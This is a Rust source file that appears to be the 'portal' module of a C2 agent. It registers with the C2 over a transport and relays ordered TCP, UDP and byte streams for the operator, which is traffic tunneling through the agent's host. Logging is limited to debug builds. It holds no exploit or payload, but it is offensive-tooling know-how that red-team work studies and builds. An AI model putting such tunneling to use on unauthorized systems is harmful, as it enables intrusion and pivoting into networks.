use anyhow::Result;
use pb::c2::{CreatePortalRequest, CreatePortalResponse};
use pb::portal::{mote::Payload, Mote};
use portal_stream::{OrderedReader, PayloadSequencer};
use std::collections::HashMap;
use tokio::sync::mpsc;
use transport::Transport;

use super::{bytes, tcp, udp};

/// Context for a single stream ID
struct StreamContext {
    reader: OrderedReader,
    tx: mpsc::Sender<Mote>,
}

pub async fn run<T: Transport + Send + Sync + 'static>(
    task_id: i64,
    mut transport: T,
) -> Result<()> {
    let (req_tx, req_rx) = mpsc::channel::<CreatePortalRequest>(100);
    let (resp_tx, mut resp_rx) = mpsc::channel::<CreatePortalResponse>(100);

    // Start transport loop
    // Note: We use a separate task for transport since it might block or be long-running
    let transport_handle = tokio::spawn(async move {
        if let Err(e) = transport.create_portal(req_rx, resp_tx).await {
            #[cfg(debug_assertions)]
            log::error!("Portal transport error: {}", e);
        }
    });

    // Map of stream_id -> StreamContext
    // Each stream has its own OrderedReader and a sender to its handler task
    let mut streams: HashMap<String, StreamContext> = HashMap::new();

    // Map to track running tasks
    let mut tasks = Vec::new();

    // Channel for handler tasks to send outgoing motes back to main loop
    let (out_tx, mut out_rx) = mpsc::channel::<Mote>(100);

    // Send initial registration message
    if req_tx
        .send(CreatePortalRequest {
            task_id,
            mote: None,
        })
        .await
        .is_err()
    {
        return Err(anyhow::anyhow!("Failed to send initial portal registration"));
    }

    loop {
        tokio::select! {
            // Incoming message from C2 (via transport)
            msg = resp_rx.recv() => {
                match msg {
                    Some(resp) => {
                         if let Some(mote) = resp.mote {
                            if let Err(e) = handle_incoming_mote(mote, &mut streams, &out_tx, &mut tasks).await {
                                #[cfg(debug_assertions)]
                                log::error!("Error handling incoming mote: {}", e);
                            }
                         }
                    }
                    None => {
                        // Transport closed
                        break;
                    }
                }
            }

            // Outgoing message from handler tasks
            msg = out_rx.recv() => {
                match msg {
                    Some(mote) => {
                        let req = CreatePortalRequest {
                            task_id,
                            mote: Some(mote),
                        };
                        if req_tx.send(req).await.is_err() {
                            break;
                        }
                    }
                    None => {
                        break; // All handlers closed? Unlikely.
                    }
                }
            }
        }
    }

    // Cleanup
    transport_handle.abort();
    for task in tasks {
        task.abort();
    }

    Ok(())
}

async fn handle_incoming_mote(
    mote: Mote,
    streams: &mut HashMap<String, StreamContext>,
    out_tx: &mpsc::Sender<Mote>,
    tasks: &mut Vec<tokio::task::JoinHandle<()>>,
) -> Result<()> {
    let stream_id = mote.stream_id.clone();

    // Get or create context
    if !streams.contains_key(&stream_id) {
        // Create new stream context
        let (tx, rx) = mpsc::channel::<Mote>(100);
        let reader = OrderedReader::new();

        streams.insert(
            stream_id.clone(),
            StreamContext { reader, tx },
        );

        // Spawn handler task based on payload type?
        // Actually, we don't know the type until we inspect the payload.
        // But the OrderedReader just orders packets.
        // The handler logic needs to receive ordered packets.
        // So we spawn a generic handler that processes the first packet to decide implementation.

        let out_tx_clone = out_tx.clone();
        let stream_id_clone = stream_id.clone();

        let task = tokio::spawn(async move {
            if let Err(e) = stream_handler(stream_id_clone, rx, out_tx_clone).await {
                #[cfg(debug_assertions)]
                log::error!("Stream handler error: {}", e);
            }
        });
        tasks.push(task);
    }

    let ctx = streams.get_mut(&stream_id).unwrap();

    // Process through OrderedReader
    // Note: OrderedReader.process is synchronous, so we can call it here.
    match ctx.reader.process(mote) {
        Ok(Some(ordered_motes)) => {
            for m in ordered_motes {
                if ctx.tx.send(m).await.is_err() {
                    // Handler closed, maybe remove stream?
                    // For now, we just ignore/log
                    #[cfg(debug_assertions)]
                    log::warn!("Stream handler closed for {}", stream_id);
                }
            }
        }
        Ok(None) => {
            // Buffered or duplicate
        }
        Err(e) => {
            // Buffer overflow or timeout
            return Err(e);
        }
    }

    Ok(())
}

async fn stream_handler(
    stream_id: String,
    mut rx: mpsc::Receiver<Mote>,
    out_tx: mpsc::Sender<Mote>,
) -> Result<()> {
    // Wait for first message to determine type
    let first_mote = match rx.recv().await {
        Some(m) => m,
        None => return Ok(()),
    };

    let sequencer = PayloadSequencer::new(stream_id.clone());

    // Determine handler based on payload
    if let Some(payload) = &first_mote.payload {
        match payload {
            Payload::Tcp(_) => {
                tcp::handle_tcp(first_mote, rx, out_tx, sequencer).await
            }
            Payload::Udp(_) => {
                udp::handle_udp(first_mote, rx, out_tx, sequencer).await
            }
            Payload::Bytes(_) => {
                bytes::handle_bytes(first_mote, rx, out_tx, sequencer).await
            }
        }
    } else {
        Ok(())
    }
}
